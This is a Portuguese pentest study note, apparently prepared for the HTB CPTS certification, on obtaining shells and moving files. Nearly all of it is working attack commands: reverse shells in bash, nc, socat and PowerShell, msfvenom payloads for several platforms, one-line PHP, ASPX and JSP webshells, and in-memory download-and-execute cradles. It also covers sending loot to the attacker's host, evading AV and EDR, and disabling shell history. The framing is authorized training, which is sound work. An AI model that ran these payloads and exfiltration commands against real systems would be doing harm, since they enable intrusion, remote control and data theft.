---
tema: Pentest
tópico: Fase 07 — Shells e Transferência de Arquivos
tags: [htb, cpts, fase, shells, msfvenom, tty, transferencia, opsec]
dificuldade: fundamental
---

# 🐚 Fase 07 — Shells e Transferência de Arquivos

> [!info] Objetivo da fase
> Transformar um ponto de execução frágil em um **acesso estável, interativo e abastecido de ferramentas**. Shell sem TTY quebra `sudo`, `su`, editores e SSH. Ferramenta que não chegou no alvo é ferramenta que não existe. Esta fase é infraestrutura: sem ela, a escalada de privilégio vira sofrimento.

## 🎯 Quando entrar

- Você obteve execução de comando (RCE, webshell, módulo do Metasploit) e precisa de interatividade real.
- Precisa subir binários/scripts (linpeas, winPEAS, chisel, SharpHound) para o alvo.
- Precisa **baixar** artefatos do alvo (hashes, arquivos de config, dumps) para sua máquina.
- Vai montar pivô e precisa de ferramenta de túnel no host comprometido (Fase 08).
- Sempre depois de cada novo host comprometido — o catálogo de transferência depende do SO e do que está instalado.

## 📥 Pré-requisitos e inputs

| Input | Observação |
|-------|-----------|
| Execução de comando no alvo | Shell reversa, webshell, RCE cega |
| SO e arquitetura do alvo | `uname -a`, `systeminfo`, `echo $SHELL` |
| Seu IP alcançável | `ip a` → `tun0` (VPN) ou `eth0` (rede local) |
| Saída de rede do alvo | Egress permitido? Só 80/443? DNS? |
| Diretório gravável | `/tmp`, `/dev/shm`, `C:\Windows\Temp` |
| AV/EDR presente | Define se dá para gravar binário em disco |
| Ferramentas locais prontas | `/opt/`, `/usr/share/windows/` |

**Confirme o IP do atacante antes de gerar qualquer payload — `LHOST` errado é o erro nº 1 da fase.**

```bash
ip a | grep -E 'tun0|eth0' -A2
```

## 🪜 Passo a passo

### 1. Escolha o sentido da conexão

| Tipo | Como funciona | Quando usar |
|------|---------------|-------------|
| **Reverse (reversa)** | Alvo conecta no atacante | Padrão. Fura NAT/firewall de entrada; egress quase sempre liberado |
| **Bind** | Atacante conecta no alvo | Quando egress é bloqueado mas entrada é permitida; raro e frágil |

```bash
# Reverse bash (Linux) — o alvo inicia a conexão
bash -i >& /dev/tcp/<IP>/4444 0>&1

# Reverse com nc, quando bash não tem /dev/tcp
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> 4444 > /tmp/f

# Bind: o alvo abre a porta; você conecta depois
nc -lvnp 4444 -e /bin/bash        # alvo (variante com -e)
# e do atacante:
nc <IP_ALVO> 4444
```

> [!tip] Regra prática
> Se a reverse não volta, **antes de mudar de payload**, verifique: (1) `LHOST` correto, (2) listener já escutando, (3) egress do alvo (teste HTTP para sua máquina), (4) firewall do atacante. Mudar de payload sem checar isso é perder uma hora.

### 2. Entenda staged vs stageless

A distinção muda o nome do payload e o comportamento na rede.

| Tipo | Nome do payload | Comportamento | Uso |
|------|----------------|----------------|-----|
| Staged | `windows/x64/shell/reverse_tcp` (barra) | Baixa um stub pequeno e depois o restante | Rede confiável, payload grande |
| Stageless | `windows/x64/shell_reverse_tcp` (underscore) | Payload inteiro de uma vez | Conexão instável, WAF, payload único |

Mesma lógica no Meterpreter: `meterpreter/reverse_tcp` é staged, `meterpreter_reverse_tcp` é stageless.

**Vantagem do staged:** o primeiro estágio é minúsculo, então passa onde payload grande é bloqueado. **Desvantagem:** exige duas conexões — se o egress é instável, falha no meio. **Stageless** é mais robusto em rede ruim, mas maior e mais fácil de detectar por assinatura.

### 3. Gere payloads com msfvenom

```bash
# Linux ELF — shell reversa simples
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf

# Windows EXE — Meterpreter stageless (mais robusto)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe

# Windows EXE — Meterpreter sobre HTTPS (fura proxy e inspeção simples)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe -o shell.exe

# ASPX (IIS) — webshell de execução
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx

# ASP clássico
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f asp -o shell.asp

# JSP (Tomcat/Jetty) — arquivo solto
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.jsp

# WAR — para deploy no Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war

# PHP — payload cru, cabe dentro de um arquivo .php
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw -o shell.php
# (php/reverse_php exige listener do Metasploit; para shell crua use a webshell manual abaixo)

# Codificação/encoders (ofuscação leve; NÃO substitui evasão real)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o shell.exe
```

Para decodificar/inspecionar um payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe --platform windows -a x64 -o s.exe
file s.exe && sha256sum s.exe    # registre o hash: ele vai no relatório
```

### 4. Webshells manuais (quando não precisa de Meterpreter)

Uma webshell de uma linha é menos detectável e mais fácil de limpar.

```php
<?php system($_GET["c"]); ?>                       <!-- PHP mais simples -->
<?php echo shell_exec($_GET["c"]); ?>              <!-- quando system está desabilitado -->
<?php passthru($_REQUEST["c"]); ?>                 <!-- aceita GET e POST -->
```

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]); %>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

Uso e verificação:

```bash
# Teste a webshell antes de confiar nela — sempre com comando inócuo
curl "http://<DOMINIO>/uploads/shell.php?c=id"
curl -X POST "http://<DOMINIO>/shell.aspx" -d "c=whoami"
```

> [!warning] Webshell é artefato para limpar
> Anote o caminho exato de cada webshell que criar. No encerramento, remova todas. Webshell esquecida é backdoor entregue ao cliente.

### 5. Listeners

```bash
# nc básico (com rlwrap para ter histórico e edição de linha)
rlwrap -cAr nc -lvnp 4444

# socat como listener com TTY completa — muito melhor que nc para Linux
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Payload socat correspondente no alvo (shell totalmente interativa)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444

# Handler do Metasploit (obrigatório para payloads com estágio)
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter_reverse_tcp; \
  set LHOST <IP>; set LPORT 4444; set ExitOnSession false; run -j"
```

**O `PAYLOAD` do handler precisa casar exatamente com o payload gerado** (staged vs stageless, mesmo LPORT). Incompatibilidade = sessão que abre e morre.

### 6. Upgrade da TTY — o passo que ninguém faz e todos sofrem

```bash
# 1) Dentro da shell: invoca um PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (se não houver python3, tente: python -c '...', script -qc /bin/bash /dev/null)

# 2) Ctrl+Z  -> suspende a shell e volta ao seu terminal
stty raw -echo; fg        # devolve o controle; Enter duas vezes
# 3) Ajusta o terminal
export TERM=xterm
export SHELL=/bin/bash
stty rows 45 cols 180     # use o tamanho real: `stty -a` no seu terminal
```

Por que importa: sem PTY, `sudo` não pede senha corretamente, `su` quebra, `nano`/`vim` corrompem a tela, `ssh` não funciona, Ctrl+C mata sua própria shell.

### 7. PowerShell — shell e download-exec

```powershell
# Reverse shell PowerShell puro (bloco único, sem arquivo em disco)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"

# Download cradle em memória — nada toca o disco
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1')
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')"

# Comando codificado em base64 (UTF-16LE) — dribla aspas e filtros simples
# Gere o base64 do comando e passe em -EncodedCommand
powershell -EncodedCommand <BASE64_UTF16LE>

# Shell totalmente interativa sem AV de terminal: ConPtyShell (hoje, wsmprovhost)
IEX(IWR http://<IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <IP> 4444
```

Para gerar o base64 corretamente:

```bash
echo -n 'IEX(IWR http://<IP>/shell.ps1 -UseBasicParsing)' | iconv -t UTF-16LE | base64 -w0
```

### 8. Matriz de transferência

#### Linux — baixar do atacante para o alvo

| Método | Comando no alvo | Quando usar |
|--------|----------------|-------------|
| `wget` | `wget http://<IP>:8000/tool -O /tmp/tool` | Mais comum |
| `curl` | `curl -O http://<IP>:8000/tool` | `wget` ausente |
| `/dev/tcp` | `exec 3<>/dev/tcp/<IP>/8000; echo -e "GET /tool HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/tool` | Sem wget/curl e com bash |
| `nc` | `nc <IP> 8000 > /tmp/tool` | Combinado com `nc -lvnp 8000 < tool` |
| `scp` | `scp <USUARIO>@<IP>:/path/tool /tmp/` | Você tem credencial SSH |
| `socat` | `socat TCP:<IP>:8000 CREATE:/tmp/tool` | Binário já presente |
| `base64` | `echo <BASE64> \| base64 -d > /tmp/tool` | Sem rede; arquivos pequenos |
| `php` | `php -r '$c=file_get_contents("http://<IP>/tool");file_put_contents("/tmp/tool",$c);'` | Web server com PHP CLI |

#### Linux — enviar do alvo para o atacante

```bash
# Atacante: receptor
nc -lvnp 9001 > loot.tar.gz
# Alvo: envia
nc <IP> 9001 < /tmp/loot.tar.gz

# Upload HTTP (na sua máquina, sem servidor de upload):
#   use um servidor que aceite PUT, p.ex.:
python3 -m uploadserver 8000
# Alvo:
curl -X POST -F "file=@/tmp/loot.tar.gz" http://<IP>:8000/upload
```

#### Windows — baixar do atacante para o alvo

| Método | Comando | Nota |
|--------|---------|------|
| PowerShell `IWR` | `IWR http://<IP>/tool.exe -OutFile C:\Windows\Temp\tool.exe` | Nativo, Win7+ com PS 3+ |
| PowerShell `DownloadFile` | `(New-Object Net.WebClient).DownloadFile('http://<IP>/tool.exe','C:\Windows\Temp\tool.exe')` | Funciona em PS 2 |
| `certutil` | `certutil -urlcache -split -f http://<IP>/tool.exe C:\Windows\Temp\tool.exe` | Assinado pela Microsoft, raramente bloqueado |
| `bitsadmin` | `bitsadmin /transfer job /download /priority high http://<IP>/tool.exe C:\Windows\Temp\tool.exe` | Legado, ainda útil |
| `curl.exe` | `curl.exe -o C:\Windows\Temp\tool.exe http://<IP>/tool.exe` | Presente no Win10/Server2019+ |
| SMB | `copy \\<IP>\share\tool.exe C:\Windows\Temp\` | Rápido e bidirecional |
| `net use` | `net use \\<IP>\share /user:<USUARIO> <SENHA>` | Antes do `copy` |
| `nc.exe`/`ncat` | `nc.exe <IP> 8000 > tool.exe` | Requer binário já no alvo |
| Download-exec | `mshta http://<IP>/x.hta`, `regsvr32 /s /u /i:http://<IP>/x.sct scrobj.dll` | Executa sem gravar em disco |

```bash
# Servidor SMB no atacante (impacket) — o alvo monta como \\<IP>\share
smbserver.py share . -smb2support

# Servidor HTTP simples
python3 -m http.server 8000
```

#### Windows — enviar do alvo para o atacante

```powershell
# POST de arquivo para um endpoint que você controla
IWR -Uri http://<IP>:8000/upload -Method POST -InFile C:\Windows\Temp\loot.zip
Invoke-RestMethod -Uri http://<IP>:8000/ -Method Post -InFile C:\temp\loot.zip

# Via SMB (mais simples quando o servidor smbserver está de pé)
copy C:\Windows\Temp\loot.zip \\<IP>\share\
```

### 9. Onde gravar no alvo

| SO | Diretórios | Por quê |
|----|-----------|---------|
| Linux | `/tmp`, `/dev/shm`, `/var/tmp` | Graváveis por todos; `/dev/shm` é RAM (não toca disco) |
| Linux | `/home/<USUARIO>/.cache`, `/run/user/<UID>` | Menos auditado que `/tmp` |
| Windows | `C:\Windows\Temp`, `%TEMP%` | Gravável por usuário comum |
| Windows | `C:\Users\Public`, `C:\ProgramData` | Gravável por padrão, usado por serviços |
| Windows | `C:\ProgramData\Microsoft\Windows\Caches` | Menos inspecionado |

**Prefira ferramentas sem disco quando o EDR está ativo:** script em memória (`IEX`), execução a partir de share SMB, ou `mshta`/`rundll32` com download-exec.

### 10. Limpeza e OPSEC

```bash
# Antes de sair, remova o que criou (na ordem inversa da criação)
rm -f /tmp/linpeas.sh /tmp/shell.elf /tmp/f
# Windows
del C:\Windows\Temp\tool.exe
```

- Registre **hash SHA256** de cada ferramenta baixada (prova de que o cliente não foi infectado por malware de terceiro).
- Nunca deixe webshell ativa ao finalizar — se precisar manter, avise e documente.
- Não use nomes óbvios (`shell.exe`, `hack.php`). Nomes comuns reduzem alarme do AV e do analista.
- Evite `history` persistindo: `unset HISTFILE` / `export HISTFILESIZE=0`.
- Saiba o que o EDR detecta: binário em disco, execução de `powershell -enc`, conexão de saída para IP desconhecido. Reduza os três ao mínimo.
- Nunca reutilize payload com `LHOST` antigo — gera conexão para IP errado e ruído para terceiros.

## 🧰 Ferramentas

| Ferramenta | O que faz | Quando usar |
|-----------|-----------|-------------|
| `msfvenom` | Gera payloads e encoders | Precisar de binário/webshell por plataforma |
| `msfconsole multi/handler` | Recebe sessões Metasploit | Payloads com estágio ou Meterpreter |
| `nc` / `ncat` | Listener simples e transferência | Shell raw e arquivos pequenos |
| `socat` | Túnel e PTY completa | Shell Linux interativa de verdade |
| `rlwrap` | Histórico/edição no nc | Toda shell nc |
| `python3 -m http.server` | Servidor de arquivos | Transferência mais comum |
| `smbserver.py` | Servidor SMB | Transferência Windows ↔ atacante |
| `uploadserver` | Servidor com upload HTTP | Exfiltrar do alvo para o atacante |
| `Invoke-PowerShellTcp` (Nishang) | Reverse shell PS | Windows com PS habilitado |
| `ConPtyShell` | Shell PS totalmente interativa | Substitui winpty/upgrade manual |
| `chisel`, `socat`, `ligolo` | Tunelamento | Preparação para Fase 08 |

## 🔀 Árvore de decisão

| Condição | Ação |
|----------|------|
| Reverse shell não conecta | Cheque `LHOST`, listener e egress antes de trocar payload |
| Egress bloqueado, entrada liberada | Payload bind |
| Conexão instável / cai no meio | Payload **stageless** |
| Precisa furar proxy/inspeção | `reverse_https` na 443 |
| Web server com execução (PHP) | Webshell de uma linha + `?c=id` |
| Servidor IIS (.aspx/.asmx) | Webshell ASPX, senão `-f aspx` do msfvenom |
| Tomcat/Jetty | WAR deployado em `/manager` ou `/api` |
| Shell Linux sem PTY | `pty.spawn` + `stty raw -echo; fg` |
| `sudo`/`su`/`vim` quebrando na shell | É o sintoma clássico de falta de TTY: faça o upgrade |
| Windows com PowerShell | `IEX(IWR ...)` em memória |
| PowerShell bloqueado por política | `mshta`, `regsvr32`, `rundll32`, ou binário assinado |
| Sem `wget`/`curl` no Linux | `nc`, `/dev/tcp`, `base64`, `php -r` |
| Sem `IWR`/`certutil` no Windows | `bitsadmin`, `curl.exe`, SMB, `net use` |
| EDR ativo | Prefira execução em memória e share SMB; nada em disco |
| Arquivo grande (dumps) | Comprima, divida (`split`) e envie por `nc`/SMB |
| Só DNS liberado | Exfiltração por DNS (Fase 08/11) |
| Terminou o acesso | Remova artefatos, registre hashes, `unset HISTFILE` |

## 📤 Evidências a registrar

- Payload usado: tipo, `LHOST`/`LPORT`, comando de geração completo, **SHA256**.
- Caminho do arquivo no alvo e o diretório usado.
- Comando de cada transferência (origem → destino, método).
- Tipo de shell obtida: raw, PTY, Meterpreter, webshell (com URL).
- Webshells criadas — caminho exato + plano de remoção.
- Saída das primeiras enumerações pós-shell (`id`, `whoami`, `hostname`, `ip a`).
- Ferramentas transferidas (nome, versão, hash) para a lista de limpeza.
- Se algo ficou no alvo: o quê, onde, por quê.

## 🕳️ Pegadinhas

> [!warning] Armadilhas desta fase
> - `LHOST` errado (`eth0` em vez de `tun0`) — a causa nº 1 de "shell não volta".
> - Handler com payload que não casa (staged × stageless, porta diferente) — sessão morre na hora.
> - Rodar payload sem listener ativo: a conexão é perdida e o exploit pode ser consumido.
> - Webshell em diretório servido como estático: o código aparece como texto e não executa.
> - Upload de `.php` renomeado para `.jpg` que o servidor não processa: testar sempre com `id`.
> - Esquecer `chmod +x` no ELF baixado.
> - `python3 -m http.server` na porta 8000 com firewall do atacante fechado.
> - Tentar `scp`/`ssh` de dentro de shell sem PTY.
> - Gravar binário em disco com EDR ativo → alerta e possível bloqueio de conta.
> - Não usar `rlwrap`: Ctrl+C mata a shell e você perde o foothold.
> - Deixar webshell, arquivo e conta criados — backdoor entregue ao cliente.
> - Baixar ferramentas de fontes aleatórias sem conferir hash.
> - Reutilizar `meterpreter/reverse_tcp` (staged) achando que é stageless por causa do nome.

## ✅ Checklist

- [ ] `LHOST` confirmado com `ip a`
- [ ] Listener ativo **antes** de disparar o payload
- [ ] Payload e handler com o mesmo tipo (staged/stageless) e porta
- [ ] Shell reversa obtida e reconectável
- [ ] TTY atualizada (`pty.spawn` + `stty raw -echo; fg`)
- [ ] `TERM`, `SHELL`, `rows`/`cols` ajustados
- [ ] Diretório de trabalho escolhido e gravável
- [ ] Ferramentas necessárias transferidas (com hash registrado)
- [ ] Testada a transferência de volta (upload de loot)
- [ ] Caminho de cada webshell anotado
- [ ] `HISTFILE` limpo / histórico desabilitado
- [ ] Artefatos removidos do alvo
- [ ] Lista de limpeza atualizada no relatório

## 🔗 Relacionado

- [[Fase 06 - Vulnerabilidade e Exploração]]
- [[Fase 08 - Pivoting e Tunneling]]
- [[CPTS 08 - Shells and Payloads]]
- [[CPTS 07 - File Transfers]]
